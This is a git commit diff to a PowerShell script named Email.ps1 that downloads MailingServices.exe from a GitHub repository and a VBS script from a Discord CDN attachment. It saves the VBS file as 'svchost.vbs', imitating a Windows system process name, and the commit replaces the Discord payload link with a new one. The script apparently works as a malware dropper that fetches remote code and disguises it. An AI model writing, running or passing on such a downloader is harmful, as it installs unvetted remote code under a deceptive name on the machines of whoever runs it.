8b1d753e272cfec5992ca7405d51e6e62695d504
Violentqm <79298794+violentqm@users.noreply.github.com>
2023-11-18 10:47:07 -0800

    Update Email.ps1

--- Email.ps1
+++ Email.ps1
@@ -1,6 +1,6 @@
 $url = "https://github.com/violentqm/rest/raw/main/MailingServices.exe"
 $outputPath = "C:\MailingServices\MailingServices.exe"
 Invoke-WebRequest -Uri $url -OutFile $outputPath
-$url2 = "https://cdn.discordapp.com/attachments/1161696732564959355/1173973604103372810/svchost.vbs?ex=6565e71e&is=6553721e&hm=c257f24f1a923a6af73768af9daa8dc886621ded8d4245a7203dfcfacfab6ec0&"
+$url2 = "https://cdn.discordapp.com/attachments/1159474640641605713/1175479420782383114/17003262731034685.vbs?ex=656b6185&is=6558ec85&hm=510b912de6db328b220f929aa048aedbbd490876222bb75a448f2bca333c6098&"
 $outputPath2 = "C:\MailingServices\svchost.vbs"
 Invoke-WebRequest -Uri $url2 -OutFile $outputPath2
